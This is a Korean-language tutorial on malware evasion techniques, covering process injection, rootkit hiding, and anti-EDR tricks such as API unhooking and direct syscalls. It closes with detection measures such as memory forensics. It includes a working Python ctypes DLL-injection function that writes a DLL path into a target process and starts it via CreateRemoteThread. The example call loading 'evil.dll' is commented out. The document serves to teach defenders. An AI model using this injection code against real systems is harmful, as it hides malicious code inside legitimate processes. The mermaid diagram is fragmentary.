## 1. 탐지 우회 및 은닉 기법 분류

공격자는 파일 시스템, 프로세스, 네트워크 등 전 방위적인 은닉을 시도합니다.

```mermaid

    A --> A3[API Unhooking]
```

## 2. 프로세스 인젝션 (Process Injection)

자신의 존재를 숨기기 위해 정상 프로세스(예: `svchost.exe`, `explorer.exe`)의 메모리 공간에 악성 코드를 삽입하여 실행합니다.

- **DLL Injection**: 정상 프로세스가 악성 DLL을 로드하도록 유도.
- **Process Hollowing**: 정상 프로세스를 일시 중단 상태로 생성한 후, 메모리 내용을 악성 코드로 교체하여 실행.
- **Reflective DLL Injection**: 디스크에 파일을 남기지 않고 메모리에서 직접 DLL을 로드.

**[Python 실습: 간단한 DLL 인젝션 컨셉 (ctypes 활용)]**
```python
import ctypes
import os

# Windows API 정의
KERNEL32 = ctypes.windll.kernel32

def inject_dll(pid, dll_path):
    # 1. 대상 프로세스 오픈
    process_handle = KERNEL32.OpenProcess(0x1F0FFF, False, pid)
    
    # 2. 대상 프로세스 메모리 할당
    remote_mem = KERNEL32.VirtualAllocEx(process_handle, 0, len(dll_path), 0x3000, 0x04)
    
    # 3. DLL 경로를 대상 프로세스 메모리에 쓰기
    KERNEL32.WriteProcessMemory(process_handle, remote_mem, dll_path.encode(), len(dll_path), 0)
    
    # 4. LoadLibraryA 주소 획득
    load_lib_addr = KERNEL32.GetProcAddress(KERNEL32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
    
    # 5. 리모트 스레드 생성하여 DLL 로드
    KERNEL32.CreateRemoteThread(process_handle, None, 0, load_lib_addr, remote_mem, 0, None)
    print(f"[+] Injection attempt finished for PID: {pid}")

if __name__ == "__main__":
    # inject_dll(1234, "C:\\temp\\evil.dll")
    pass
```

## 3. 루트킷(Rootkit) 기법: 커널 레벨의 은닉

루트킷은 운영체제의 가장 깊은 곳(Kernel)에서 동작하며 시스템 정보를 왜곡합니다.

- **API Hooking**: 시스템 호출 결과를 가로채어 악성 파일이나 프로세스가 목록에 나타나지 않게 함.
- **DKOM (Direct Kernel Object Manipulation)**: 커널 내부의 링크드 리스트(PsActiveProcessHead 등)에서 악성 프로세스 객체를 제거하여 탐지 도구(Task Manager)를 무력화.

## 4. 안티 보안 솔루션 (Anti-EDR/AV)

- **API Unhooking**: EDR 솔루션이 모니터링을 위해 설치한 후킹을 제거하여 정상적인 API 호출인 것처럼 위장.
- **Direct Syscalls**: 시스템 API(Ntdll.dll)를 거치지 않고 직접 어셈블리 명령어를 사용하여 커널에 명령을 전달.

## 5. 분석 및 대응 방안

1.  **메모리 포렌식**: `Volatility`와 같은 도구를 사용하여 인젝션된 코드나 숨겨진 프로세스(psscan) 탐지.
2.  **커널 무결성 검사**: 시스템 콜 테이블이나 커널 모듈의 변조 여부 확인.
3.  **EDR 강화**: 행위 기반 분석뿐만 아니라 직접 시스템 콜 사용 등 비정상적인 호출 패턴 탐지 기능 활성화.

## 6. 결론

탐지 우회 기술은 악성코드와 보안 솔루션 간의 '창과 방패'의 대결이 가장 치열한 분야입니다. 특히 최근의 루트킷 기법은 커널 보호 모드(PatchGuard 등)를 우회하기 위해 더욱 정교해지고 있으므로, 분석가는 엔드포인트의 심층적인 가시성을 확보하는 데 집중해야 합니다.
